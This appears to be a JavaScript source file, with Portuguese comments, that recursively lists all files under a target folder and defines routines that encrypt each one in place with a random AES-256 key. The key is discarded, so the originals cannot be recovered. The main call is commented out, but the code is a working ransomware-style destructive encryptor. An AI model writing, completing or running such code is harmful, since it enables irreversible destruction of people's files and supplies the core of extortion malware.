import crypto from 'crypto';
import fs from 'fs';

/**Function que passado o diretório(path) da pasta ele retorna um objeto com os items e sub-pastas
 *
 * @param {string} dir
 * @returns
 */
function readDir(dir) {
  const struct = {};
  function arranjo(a, b) {

    function status(dir , parametro) {
      return fs
        .statSync(`${dir}/${parametro}`)
        .mtime
        .getTime()
    }
    return  status(dir , a)- status(dir , b)
  }

  function Verificar(file) {
    const ehUmArquivo = fs.lstatSync(`${dir}/${file}`).isFile()
    const ehUmaPasta = fs.lstatSync(`${dir}/${file}`).isDirectory()

    if (ehUmArquivo) {
        struct[file] = null;
      } else if (ehUmaPasta) {
        struct[file] = readDir(`${dir}/${file}`);
      }
  }

  fs
    .readdirSync(dir)
    .sort(arranjo)
    .forEach(Verificar);

  return struct;
}

function TodosOsArquivos(path) {
  const todosItems = [];
  function Verificar(path) {
    const estrutura = readDir(path);
    const itemsDaEstrutura = Object.keys(estrutura);
    function filtroSubPastas(item) {
      return estrutura[item] !== null;
    }
    function filtroItemsDaPasta(item) {
      return estrutura[item] === null;
    }
    function Formatar(item) {
      const pathItem = `${path}/${item}`;
      return pathItem;
    }
    const SubPastas = itemsDaEstrutura
      .filter(filtroSubPastas);
    const ItemsDaPasta = itemsDaEstrutura
      .filter(filtroItemsDaPasta)
      .map(Formatar);
    todosItems.push(...ItemsDaPasta);

    for (let index = 0; index < SubPastas.length; index++) {
      const pathNovo = `${path}/${SubPastas[index]}`;
      todosItems.push(...Verificar(pathNovo));
    }

    return todosItems;
  }
  return Verificar(path);
}

const arquivos = TodosOsArquivos('./../../Modificar');

/**
* Function encrypts given input buffer using random AES-256 bit key.
* Returns key buffer and encrypted message buffer
*
* @param {Buffer} message
*/
async function aesEncrypt(message) {
  const key = crypto.randomBytes(256 / 8);
  const aes = crypto.createCipher('aes-256-ctr', key);
  const encryptedBuffer = await aes.update(message);
  await aes.final();
  return { message: encryptedBuffer, key };
}

async function EncriptarOArquivo(FILE_TO_ENCRYPT) {
  const fileToEncrypt = await fs.readFileSync(FILE_TO_ENCRYPT);
  const {
    message: encryptedFileBuffer,
  } = await aesEncrypt(fileToEncrypt);

  return await fs.writeFileSync(FILE_TO_ENCRYPT, encryptedFileBuffer);
}

async function start() {
  const Encriptados = [];
  for (let index = 0; index < arquivos.length; index++) {
    Encriptados.push(EncriptarOArquivo(arquivos[index]));
  }
  const fullEncriptados = await Promise.all(Encriptados);
}
console.log(arquivos);
// start();
